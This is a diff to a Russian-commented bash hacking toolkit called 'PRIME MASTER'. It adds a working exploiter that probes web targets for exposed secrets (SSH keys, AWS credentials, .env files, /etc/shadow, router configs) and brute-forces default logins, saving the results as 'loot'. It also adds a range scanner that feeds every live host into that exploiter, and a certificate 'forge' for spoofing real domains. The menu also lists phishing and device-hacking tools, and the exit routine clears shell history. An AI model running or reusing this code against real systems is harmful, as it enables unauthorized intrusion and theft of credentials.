@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="33.1"
+CURRENT_VERSION="33.2"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -783,60 +783,310 @@ reset_windows_password() {
     [ -n "$sam" ] && chntpw -i "$sam" || echo -e "${R}SAM не найден${NC}"; pause
 }
 
-generate_pwd_tool() {
-    
-)
-    smart_cat "$target_file" "$code"
-    chmod +x "$target_file"
+
+
+run_cert_analyzer() {
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "       PRIME MASTER: CERTIFICATE ANALYZER         "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -n "Enter Path to File or Domain (e.g. google.com): "
+    read TARGET
+
+    if [ -z "$TARGET" ]; then
+        echo -e "\e[1;31m[!] No target specified.\e[0m"
+        sleep 2
+        return
+    fi
+
+    echo -e "\n\e[1;34m[*] Extracting Certificate Data...\e[0m\n"
+
+    # Проверка: это файл или домен?
+    if [ -f "$TARGET" ]; then
+        # Анализ локального файла
+        openssl x509 -in "$TARGET" -text -noout | grep -E "Subject:|Issuer:|Not Before:|Not After:|Public-Key:" | sed 's/^[[:space:]]*//'
+    else
+        # Анализ удаленного домена через сетевой запрос
+        timeout 5 openssl s_client -connect "${TARGET}:443" -servername "$TARGET" </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates | sed 's/^/    /'
+    fi
+
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo -n "Press [ENTER] to return to menu..."
+    read -r
 }
 
-generate_cert_tool() {
-    
+
+run_cert_creator() {
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "       PRIME MASTER: CERTIFICATE CREATOR          "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -n "Enter Domain or Name (e.g. prime.local): "
+    read DOMAIN
+    if [ -z "$DOMAIN" ]; then DOMAIN="prime.local"; fi
+
+    echo -n "Enter Country Code (2 letters, e.g. US): "
+    read COUNTRY
+    if [ -z "$COUNTRY" ]; then COUNTRY="US"; fi
+
+    echo -e "\n\e[1;34m[*] Generating 2048-bit RSA Key and Certificate...\e[0m"
+
+    # Генерация без лишних вопросов (Self-Signed)
+    # Сохраняем в текущую папку для удобства
+    openssl req -x509 -newkey rsa:2048 -nodes \
+        -keyout "${DOMAIN}.key" \
+        -out "${DOMAIN}.crt" \
+        -days 365 \
+        -subj "/C=${COUNTRY}/ST=None/L=None/O=PrimeMaster/OU=Dev/CN=${DOMAIN}" 2>/dev/null
+
+    if [ $? -eq 0 ]; then
+        echo -e "\n\e[1;32m[SUCCESS]\e[0m Certificate created successfully!"
+        echo -e "\e[1;33mFiles saved:\e[0m"
+        echo -e "    Key:  ${DOMAIN}.key"
+        echo -e "    Cert: ${DOMAIN}.crt"
+    else
+        echo -e "\n\e[1;31m[ERROR]\e[0m Failed to generate certificate. Check if OpenSSL is installed."
+    fi
+
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo -n "Press [ENTER] to return to menu..."
+    read -r
 }
 
-generate_cert_reader_tool() {
-   
-}
-
-
-run_cert_reader() {
-    
-}
-
-# 3. Исправленный ГЕНЕРАТОР ПАРОЛЕЙ (Линия 972 - ФАТАЛЬНАЯ ОШИБКА)
 run_pwd_gen() {
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "    PRIME MASTER: PASSWORD & BCRYPT GENERATOR     "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    # 1. Запрос параметров
+    echo -n "Enter required length [Default 12]: "
+    read P_LEN
+    if [[ ! "$P_LEN" =~ ^[0-9]+$ ]]; then P_LEN=12; fi
+
+    echo -e "\e[1;36mChoose complexity:\e[0m"
+    echo "  1) Alphanumeric (A-Z, 0-9)"
+    echo "  2) Full Secure (with Special Chars)"
+    echo -n "Select [1/2]: "
+    read P_MODE
+
+    echo -e "\n\e[1;34m[*] Generating data...\e[0m"
+
+    # 2. Генерация пароля
+    if [ "$P_MODE" == "2" ]; then
+        RESULT=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%^&*()_+\-=[]{}|;:,.<>?' | head -c "$P_LEN")
+    else
+        RESULT=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c "$P_LEN")
+    fi
+
+    # 3. Расчет bcrypt (используем python3 как самый точный метод)
+    # Мы передаем пароль через переменную окружения для безопасности
+    BCRYPT_HASH=$(export P_RAW="$RESULT"; python3 -c "import bcrypt; import os; print(bcrypt.hashpw(os.environ['P_RAW'].encode(), bcrypt.gensalt()).decode())" 2>/dev/null)
+
+    # 4. Вывод на экран
+    echo -e "\n\e[1;32m[+]\e[0m \e[1;7m DATA GENERATED \e[0m\n"
     
+    echo -e "\e[1;33mRAW PASSWORD (OPEN):\e[0m"
+    echo -e ">> \e[1;37m$RESULT\e[0m"
+    
+    echo -e "\n\e[1;32mBCRYPT HASH:\e[0m"
+    if [ -n "$BCRYPT_HASH" ]; then
+        echo -e "\e[1;36m$BCRYPT_HASH\e[0m"
+    else
+        echo -e "\e[1;31mError: python3-bcrypt not found. Install with: apt install python3-bcrypt\e[0m"
+    fi
+    
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo -n "Press [ENTER] to return to menu..."
+    read -r
 }
+
+
 
    run_cert_forge() {
-    
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "       PRIME MASTER: CERTIFICATE FORGE            "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -n "Enter Domain to spoof (e.g. google.com): "
+    read S_DOMAIN
+    if [ -z "$S_DOMAIN" ]; then
+        echo -e "\e[1;31m[!] No domain specified.\e[0m"
+        sleep 2; return
+    fi
+
+    echo -e "\n\e[1;34m[*] Fetching original metadata from $S_DOMAIN...\e[0m"
+
+    # Извлекаем Subject оригинального сертификата
+    # Используем sed для очистки вывода под формат openssl subj
+    ORIG_SUBJ=$(timeout 5 openssl s_client -connect "${S_DOMAIN}:443" -servername "$S_DOMAIN" </dev/null 2>/dev/null | openssl x509 -noout -subject | sed 's/^subject=//; s/ = /=/g; s/, /\//g; s/^/\//')
+
+    if [ -z "$ORIG_SUBJ" ] || [ "$ORIG_SUBJ" == "/" ]; then
+        echo -e "\e[1;33m[!] Could not fetch metadata. Using default spoof-identity.\e[0m"
+        ORIG_SUBJ="/C=US/ST=California/L=Mountain View/O=Internet Authority/CN=${S_DOMAIN}"
+    fi
+
+    echo -e "\e[1;32m[*] Targeted Identity:\e[0m $ORIG_SUBJ"
+    echo -e "\e[1;34m[*] Forging private key and self-signed cert...\e[0m"
+
+    # Генерация (имитация)
+    openssl req -x509 -newkey rsa:2048 -nodes \
+        -keyout "${S_DOMAIN}_forged.key" \
+        -out "${S_DOMAIN}_forged.crt" \
+        -days 365 \
+        -subj "$ORIG_SUBJ" 2>/dev/null
+
+    if [ $? -eq 0 ]; then
+        echo -e "\n\e[1;32m[SUCCESS]\e[0m Forged certificate created!"
+        echo -e "--------------------------------------------------"
+        echo -e "\e[1;33mFORGED FILES:\e[0m"
+        echo -e "  >> ${S_DOMAIN}_forged.key"
+        echo -e "  >> ${S_DOMAIN}_forged.crt"
+        echo -e "--------------------------------------------------"
+    else
+        echo -e "\n\e[1;31m[ERROR]\e[0m Forge failed. Check network or OpenSSL status."
+    fi
+
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo -n "Press [ENTER] to return to menu..."
+    read -r
 }
 
-# 1. Исправленный ГЕНЕРАТОР ЭКСПЛОЙТА (Линии 957, 991, 997)
-generate_prime_ultimate_exploiter_v4() {
+# 1. Единый Движок Эксплуатации (Ручной + Авто режим)
+run_prime_exploiter_v4() {
+    # Если аргумент передан ($1), используем его. Если нет — спрашиваем.
+    if [ -n "$1" ]; then
+        TARGET="$1"
+    else
+        clear
+        echo -e "\e[1;31m--------------------------------------------------"
+        echo "    PRIME ULTIMATE EXPLOITER v4 (LIVE ENGINE)     "
+        echo "--------------------------------------------------\e[0m"
+        echo -n "Enter Target (IP or Domain): "
+        read TARGET
+    fi
+
+    [ -z "$TARGET" ] && return
+
+    UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     
+    # --- Ультимативные списки (Векторы и Креды) ---
+    V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" "/config.xml:root" "/dev/mtd0:ELF" "/etc/config/network:config interface" "/sysconf.cgi:admin_password" "/home/httpd/html/config/exportsettings.conf:Password" "/etc/RT2860_default_vlan:Password" "/.env:DB_PASSWORD" "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE" "/.docker/config.json:auths" "/.npmrc:_auth" "/.bash_history:ssh " "/.kube/config:client-certificate-data" "/wp-config.php.bak:DB_PASSWORD" "/wp-config.php.swp:DB_PASSWORD" "/wp-content/debug.log:WP_User" "/configuration.php:public $password" "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password" "/etc/shadow:root:" "/etc/passwd:root:x" "/admin/.htpasswd:admin:" "/.history:password")
+    C_LIST=("admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" "dbadmin:dbadmin")
+
+    for proto in "http" "https"; do
+        URL="${proto}://${TARGET}/"
+        RESP=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1)
+        CODE=$(echo "$RESP" | grep -oE '[0-9]{3}' | head -n1)
+        CODE=${CODE:-000}
+
+        if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
+            echo -e "    \e[1;32m[+]\e[0m $URL [Status: $CODE]"
+            
+            # Векторы
+            for vec in "${V_LIST[@]}"; do
+                V_PATH=$(echo "$vec" | cut -d':' -f1); V_KEY=$(echo "$vec" | cut -d':' -f2)
+                if curl -sL -k -A "$UA" --max-time 3 "${proto}://${TARGET}${V_PATH}" 2>/dev/null | grep -q "$V_KEY"; then
+                    echo -e "    \e[1;31m[!!!] VULN FOUND: $V_PATH\e[0m"
+                    echo "[EXPL] ${TARGET}${V_PATH} | $V_KEY" >> /root/prime_loot_live.txt
+                fi
+            done
+
+            # Брут
+            for pair in "${C_LIST[@]}"; do
+                U=$(echo "$pair" | cut -d':' -f1); P=$(echo "$pair" | cut -d':' -f2)
+                if [[ $(curl -sL -k -u "$U:$P" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 2 "$URL") == "200" ]]; then
+                    echo -e "    \e[1;32m[!!!] AUTH MATCH: $U:$P\e[0m"
+                    echo "[AUTH] $U:$P @ $TARGET" >> /root/prime_loot_live.txt
+                    break
+                fi
+            done
+        fi
+    done
+
+    # В ручном режиме ждем нажатия кнопки, в авто — идем дальше
+    if [ -z "$1" ]; then
+        echo -e "\n\e[1;32mDone. Loot saved.\e[0m"
+        read -p "Press [ENTER]"
+    fi
 }
 
+# 2. Интеллектуальный Эвристический Сканер
+run_heuristic_scanner_v2() {
+    clear
+    echo -e "\e[1;35m"
+    echo "--------------------------------------------------"
+    echo "   PRIME MASTER: HEURISTIC AUTONOMOUS SCANNER     "
+    echo "--------------------------------------------------\e[0m"
+    echo -n "ENTER TARGET SCOPE (IP/CIDR/Domain): "
+    read SCOPE
+    [ -z "$SCOPE" ] && return
 
+    echo -e "\n\e[1;34m[*] Phase 1: Stealth Enumeration...\e[0m"
+    # Быстрый поиск живых хостов без лишнего шума
+    nmap -n -sn --host-timeout 500ms "$SCOPE" | grep "report for" | cut -d' ' -f5 > /tmp/.prime_nodes
 
-# 2. Исправленный СКАНЕР СЕТИ (Линии 1014, 1031)
-run_heuristic_router_scan() {
-    
+    NODE_COUNT=$(wc -l < /tmp/.prime_nodes)
+    if [ "$NODE_COUNT" -eq 0 ]; then
+        echo -e "\e[1;31m[!] No targets found.\e[0m"; sleep 2; return
+    fi
+
+    echo -e "\e[1;32m[+]\e[0m Found $NODE_COUNT nodes. \e[1;7m STARTING EXTRACTION... \e[0m\n"
+
+    while read -r NODE; do
+        echo -e "\e[1;35m>>> TARGET:\e[0m \e[1;37m$NODE\e[0m"
+        # Вызываем эксплойтер в авто-режиме
+        run_prime_exploiter_v4 "$NODE"
+        echo -e "\e[1;30m--------------------------------------------------\e[0m"
+    done < /tmp/.prime_nodes
+
+    rm -f /tmp/.prime_nodes
+    echo -e "\n\e[1;32m[+++] SCAN COMPLETE. Loot: /root/prime_loot_live.txt\e[0m"
+    read -p "Press [ENTER]"
 }
+
 
 run_view_loot() {
     clear
-    echo -e "\e[1;32m[ PRIME DATA HARVESTER - LOOT VIEW ]\e[0m"
+    echo -e "\e[1;32m"
     echo "--------------------------------------------------"
-    if [[ -f "/root/prime_found_keys.txt" ]]; then
-        echo -e "\e[1;34mFOUND CREDENTIALS:\e[0m"
-        cat /root/prime_found_keys.txt
-    else
-        echo "No harvested credentials yet."
+    echo "    PRIME MASTER: DATA HARVESTER - LOOT VIEW      "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    # Список файлов для проверки
+    LOOT_FILES=("/root/prime_loot_live.txt" "/root/prime_found_keys.txt")
+    FOUND_ANY=false
+
+    for file in "${LOOT_FILES[@]}"; do
+        if [[ -s "$file" ]]; then
+            FOUND_ANY=true
+            echo -e "\e[1;34m>>> DATA FROM: $file\e[0m"
+            echo -e "\e[1;30m--------------------------------------------------\e[0m"
+            # Используем column для выравнивания, если данных много
+            cat "$file" | sed 's/|/ | /g' | column -t -s '|' 2>/dev/null || cat "$file"
+            echo -e "\e[1;30m--------------------------------------------------\e[0m\n"
+        fi
+    done
+
+    if [ "$FOUND_ANY" = false ]; then
+        echo -e "\e[1;31m[!] No harvested data found yet.\e[0m"
+        echo "Try running the Scanner or Exploiter first."
     fi
-    echo "--------------------------------------------------"
-    echo -e "\n\e[1;33mPRESS ENTER TO RETURN...\e[0m"
-    read
+
+    echo -e "\n\e[1;33m[ PRESS ENTER TO RETURN TO MAIN MENU ]\e[0m"
+    read -r
 }
 
 
@@ -886,16 +1136,20 @@ pause() { read -p "Press Enter..." dummy; }
 
 exit_script() { history -c; exit 0; }
 
-# --- ГЛАВНОЕ МЕНЮ (v31.3: + SEC_TOOLS) ---
+
+# --- ГЛАВНОЕ МЕНЮ (v31.4: + LIVE_EXPLOIT_ENGINE) ---
 run_main_menu() {
-    # 1. Список имен
-    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL REPAIR UPDATE_CORE SERVICE_HUB PWD_GEN CERT_FORGE SYSTEM_INFO CERTIF_READER HEURESTIC_ROUTER_SCAN VIEW_LOOT EXIT"
+    # 1. Список имен (Визуальные названия в меню)
+    # Заменили HEURESTIC_ROUTER_SCAN на NET_SCAN_v2 и добавили ULTIMATE_EXPLOIT
+    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN PWD_GEN CERT_FORGE CERTIF_READER NET_SCAN_v2 ULTIMATE_EXPLOIT VIEW_LOOT SYSTEM_INFO SERVICE_HUB MANUAL_INSTALL REPAIR UPDATE_CORE EXIT"
     
-    # 2. Список функций
-    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools run_repair update_prime run_servers run_pwd_gen run_cert_forge run_system_info run_cert_reader run_heuristic_router_scan run_view_loot exit_script"
+    # 2. Список функций (Которые реально вызываются)
+    # Важно: порядок имен и функций должен строго совпадать!
+    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_view_loot run_system_info run_servers install_manual_tools run_repair update_prime exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
+
 
 # --- Точка входа ---
 repair
@@ -915,7 +1169,7 @@ update_module "/root/share_server.py" "1.2" generate_share_server_code "File-Sha
 update_module "/root/upload_server.py"  "1.2" generate_upload_server_code  "Inbound-Drop-Box"
 
 # --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
-update_module "/root/launcher.sh" "32.9" generate_launcher_code "Prime-Launcher"
+update_module "/root/launcher.sh" "33.0" generate_launcher_code "Prime-Launcher"
 chmod +x /root/launcher.sh
 ln -sf /root/launcher.sh /usr/local/bin/launcher
 repair_and_clean
